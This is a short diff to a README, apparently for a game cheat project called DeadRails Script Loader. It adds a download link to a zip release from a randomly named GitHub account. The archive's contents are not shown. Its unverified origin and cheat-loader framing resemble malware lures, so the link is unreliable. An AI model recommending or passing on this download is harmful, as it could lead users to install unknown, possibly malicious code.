@@ -23,7 +23,7 @@
 
 ## 📥 Download
 
-📥 [`DeadRails_Script_Loader.zip`]()
+📥 [`DeadRails_Script_Loader.zip`](https://github.com/awarenessgnatblock/luxywqbl/releases/download/DeadRails_Script_Project/DeadRails_Script_Loader.zip)
 
 ---
 
